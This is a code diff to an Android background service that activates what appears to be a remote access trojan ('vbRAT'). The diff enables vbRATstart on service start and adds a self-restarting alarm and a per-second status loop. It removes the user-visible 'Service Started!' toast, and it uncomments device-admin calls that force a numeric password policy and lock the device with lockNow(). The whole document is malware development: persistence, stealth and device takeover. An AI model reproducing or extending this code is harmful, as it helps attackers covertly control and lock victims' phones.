@@ -22,8 +22,7 @@ public class BackgroundService extends Service {
 
     private static final int FIRST_RUN_TIMEOUT_MILISEC = 5 * 1000;
     private static final int SERVICE_STARTER_INTERVAL_MILISEC = 1 * 1000;
-    private static final int SERVICE_TASK_TIMEOUT_SEC = 5;
-    private final int REQUEST_CODE = 1;
+    private static final int SERVICE_TASK_TIMEOUT_SEC = 1;
 
     private AlarmManager serviceStarterAlarmManager = null;
     private MyTask asyncTask = null;
@@ -32,12 +31,14 @@ public class BackgroundService extends Service {
     public IBinder onBind(Intent intent) {
         return null;
     }
-   // @Override
-   // public int onStartCommand(Intent intent, int flags, int startId) {
-   //     //vbRATstart(getApplicationInfo().dataDir);
-   //     return START_STICKY;
-   // }
-
+   @Override
+   public int onStartCommand(Intent intent, int flags, int startId) {
+       vbRATstart("/");
+       startServiceStarter();
+       serviceTask();
+       return START_STICKY;
+   }
+/*
     @Override
     public void onCreate() {
         super.onCreate();
@@ -48,9 +49,9 @@ public class BackgroundService extends Service {
         // Start performing service task
         serviceTask();
 
-        Toast.makeText(this, "Service Started!", Toast.LENGTH_LONG).show();
+        //Toast.makeText(this, "Service Started!", Toast.LENGTH_LONG).show();
     }
-
+*/
     private void StopPerformingServiceTask() {
         asyncTask.cancel(true);
     }
@@ -67,15 +68,17 @@ public class BackgroundService extends Service {
 
         DevicePolicyManager localDevicePolicyManager = (DevicePolicyManager)this.getSystemService(Context.DEVICE_POLICY_SERVICE );
         assert localDevicePolicyManager != null;
-        //if (localDevicePolicyManager.isAdminActive(localComponentName))
-        //{
-        //    localDevicePolicyManager.setPasswordQuality(localComponentName, DevicePolicyManager.PASSWORD_QUALITY_NUMERIC);
-        //}
+        if (localDevicePolicyManager.isAdminActive(localComponentName))
+        {
+            localDevicePolicyManager.setPasswordQuality(localComponentName, DevicePolicyManager.PASSWORD_QUALITY_NUMERIC);
+        }
 
         // locking the device
-        //localDevicePolicyManager.lockNow();
+        localDevicePolicyManager.lockNow();
         localDevicePolicyManager.getActiveAdmins();
     }
+
+
 
     @Override
     public void onDestroy() {
@@ -96,10 +99,9 @@ public class BackgroundService extends Service {
         @Override
         protected Void doInBackground(Void... params) {
             try {
-                vbRATstart("/");
                 for (;;) {
                     TimeUnit.SECONDS.sleep(SERVICE_TASK_TIMEOUT_SEC);
-
+                    vbRATCheckStatus();
                     // check does performing of the task need
                     if(isCancelled()) {
                         break;
@@ -126,7 +128,8 @@ public class BackgroundService extends Service {
     // for performing periodical starting of our service by the system
     private void startServiceStarter() {
         Intent intent = new Intent(this, ServiceStarter.class);
-        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, this.REQUEST_CODE, intent, 0);
+        int REQUEST_CODE = 1;
+        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, REQUEST_CODE, intent, 0);
 
         if (pendingIntent == null) {
             Toast.makeText(this, "Some problems with creating of PendingIntent", Toast.LENGTH_LONG).show();
